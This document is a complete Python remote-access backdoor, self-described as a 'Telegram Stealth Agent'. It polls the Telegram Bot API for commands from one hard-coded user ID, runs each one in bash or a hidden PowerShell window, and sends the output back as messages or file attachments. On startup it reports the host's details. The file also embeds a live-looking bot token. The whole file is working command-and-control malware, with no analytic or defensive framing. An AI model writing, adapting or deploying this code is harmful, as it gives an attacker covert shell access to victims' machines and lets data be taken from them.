import os
import sys
import time
import json
import platform
import subprocess
import urllib.request
import urllib.parse
from pathlib import Path
from typing import Tuple, List, Dict, Any

# ================= CONFIGURATION =================
TELEGRAM_TOKEN = "8999895756:AAGftCs_gfl-D0IYboQdzaN9e3bAaI81HTc"
ALLOWED_USER_ID = 8702776834

API_BASE = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
CURRENT_DIR = Path.cwd().resolve()
# =================================================


def send_telegram_message(chat_id: int, text: str) -> None:
    """Send text message to Telegram user."""
    url = f"{API_BASE}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text[:4000]
    }
    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode('utf-8'),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=10):
            pass
    except Exception as err:
        pass


def send_telegram_document(chat_id: int, filename: str, content_bytes: bytes, caption: str = "") -> None:
    """Send file attachment to Telegram user using multipart/form-data."""
    url = f"{API_BASE}/sendDocument"
    boundary = f"----FormBoundary{int(time.time() * 1000)}"
    body = []

    # chat_id field
    body.append(f"--{boundary}".encode('utf-8'))
    body.append(b'Content-Disposition: form-data; name="chat_id"')
    body.append(b'')
    body.append(str(chat_id).encode('utf-8'))

    # caption field
    if caption:
        body.append(f"--{boundary}".encode('utf-8'))
        body.append(b'Content-Disposition: form-data; name="caption"')
        body.append(b'')
        body.append(caption[:1000].encode('utf-8'))

    # document field
    body.append(f"--{boundary}".encode('utf-8'))
    body.append(f'Content-Disposition: form-data; name="document"; filename="{filename}"'.encode('utf-8'))
    body.append(b'Content-Type: text/plain; charset=utf-8')
    body.append(b'')
    body.append(content_bytes)
    body.append(f"--{boundary}--".encode('utf-8'))
    body.append(b'')

    payload_bytes = b"\r\n".join(body)
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}

    req = urllib.request.Request(url, data=payload_bytes, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=15):
            pass
    except Exception as err:
        pass


def execute_command_silent(cmd_text: str) -> str:
    """Execute shell command silently without popping up any console windows."""
    global CURRENT_DIR

    cmd_trimmed = cmd_text.strip()

    # Handle system info command
    if cmd_trimmed in ["/sysinfo", "sysinfo", "/info"]:
        return (
            f"🖥️ Host: {platform.node()}\n"
            f"💻 OS: {platform.system()} {platform.release()} ({platform.machine()})\n"
            f"🐍 Python: {platform.python_version()}\n"
            f"📁 CWD: {CURRENT_DIR}"
        )

    # Handle directory navigation
    if cmd_trimmed.startswith("cd ") or cmd_trimmed == "cd":
        target = cmd_trimmed[3:].strip()
        if not target or target == "~":
            new_dir = Path.home()
        else:
            new_dir = (CURRENT_DIR / target).resolve()

        if new_dir.exists() and new_dir.is_dir():
            CURRENT_DIR = new_dir
            return f"📁 Directory changed to:\n{CURRENT_DIR}"
        else:
            return f"❌ Directory not found:\n{new_dir}"

    system_os = platform.system().lower()
    kwargs: Dict[str, Any] = {
        "stdout": subprocess.PIPE,
        "stderr": subprocess.STDOUT,
        "text": True,
        "encoding": "utf-8",
        "errors": "replace",
        "cwd": str(CURRENT_DIR)
    }

    # CRITICAL: Prevent CMD/PowerShell window creation on Windows
    if system_os == "windows":
        kwargs["creationflags"] = 0x08000000  # CREATE_NO_WINDOW
        shell_cmd = ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmd_text]
    else:
        executable = "/bin/bash" if Path("/bin/bash").exists() else "/bin/sh"
        shell_cmd = [executable, "-c", cmd_text]

    try:
        proc = subprocess.Popen(shell_cmd, **kwargs)
        out, _ = proc.communicate(timeout=60)
        output_str = out.strip() if out else "[No output]"
        return f"✅ Exit Code: {proc.returncode}\n📁 CWD: {CURRENT_DIR}\n\n{output_str}"
    except subprocess.TimeoutExpired:
        proc.kill()
        return "⏰ Command execution timed out (60s limit)."
    except Exception as err:
        return f"💥 Execution Error: {err}"


def get_updates(offset: int) -> Tuple[int, List[Dict[str, Any]]]:
    """Fetch updates from Telegram Bot API."""
    url = f"{API_BASE}/getUpdates?offset={offset}&timeout=10"
    req = urllib.request.Request(url)
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            if resp.status == 200:
                data = json.loads(resp.read().decode('utf-8'))
                if data.get("ok"):
                    updates = data.get("result", [])
                    new_offset = offset
                    if updates:
                        new_offset = updates[-1]["update_id"] + 1
                    return new_offset, updates
    except Exception:
        pass
    return offset, []


def main():
    print(f"[+] Starting Telegram Stealth Agent...")
    print(f"[+] Target User ID: {ALLOWED_USER_ID}")

    # Send online notification
    send_telegram_message(
        ALLOWED_USER_ID,
        f"🟢 Stealth Agent Online!\nHost: {platform.node()}\nOS: {platform.system()} {platform.release()}\nCWD: {CURRENT_DIR}"
    )

    offset = 0
    # Clear any old updates on startup
    _, initial_updates = get_updates(0)
    if initial_updates:
        offset = initial_updates[-1]["update_id"] + 1

    while True:
        try:
            offset, updates = get_updates(offset)
            for update in updates:
                message = update.get("message", {})
                from_user = message.get("from", {})
                from_id = from_user.get("id")
                text = message.get("text", "").strip()

                # Strictly verify authorized user ID
                if from_id != ALLOWED_USER_ID:
                    continue

                if not text:
                    continue

                # Execute command silently
                result = execute_command_silent(text)

                # Send result back to Telegram
                if len(result) <= 3800:
                    send_telegram_message(ALLOWED_USER_ID, result)
                else:
                    send_telegram_document(
                        ALLOWED_USER_ID,
                        "output.txt",
                        result.encode("utf-8"),
                        caption=f"📄 Output for: {text[:50]}"
                    )

        except Exception as err:
            time.sleep(2)

        time.sleep(1)


if __name__ == "__main__":
    main()
